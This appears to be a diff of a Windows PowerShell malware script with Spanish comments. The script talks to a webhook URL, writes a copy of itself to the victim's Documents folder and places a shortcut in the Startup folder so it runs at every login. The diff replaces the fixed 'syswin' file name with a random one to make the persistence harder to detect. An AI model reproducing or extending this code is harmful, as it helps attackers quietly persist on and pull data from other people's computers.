@@ -5,7 +5,7 @@ $seconds = 30
 
 # shortened URL Detection
 if ($hookurl.Ln -ne 121){
-    Write-Host "Shortened Webhook URL Detected.." 
+    Write-Host "Shortened Webhook URL Detected...." 
     $hookurl = (irm $hookurl).url
 }
 
@@ -51,8 +51,11 @@ While ($true){
 # Obtener la carpeta de documentos del usuario actual
 $documentsFolder = [Environment]::GetFolderPath("MyDocuments")
 
+# Generar un nombre aleatorio para el archivo de script
+$randomFileName = [System.IO.Path]::GetRandomFileName() + ".ps1"
+
 # Ruta completa del archivo de script en la carpeta de documentos
-$scriptPath = Join-Path -Path $documentsFolder -ChildPath "syswin.ps1"
+$scriptPath = Join-Path -Path $documentsFolder -ChildPath $randomFileName
 
 # Guardar el script en la carpeta de documentos
 Set-Content -Path $scriptPath -Value @"
@@ -111,7 +114,7 @@ While (`$true){
 $startupFolder = [Environment]::GetFolderPath("Startup")
 
 # Crear un acceso directo del script en la carpeta de inicio para que se ejecute al iniciar Windows
-$shortcutPath = Join-Path -Path $startupFolder -ChildPath "syswin.lnk"
+$shortcutPath = Join-Path -Path $startupFolder -ChildPath "$randomFileName.lnk"
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
 $Shortcut.TargetPath = "powershell.exe"
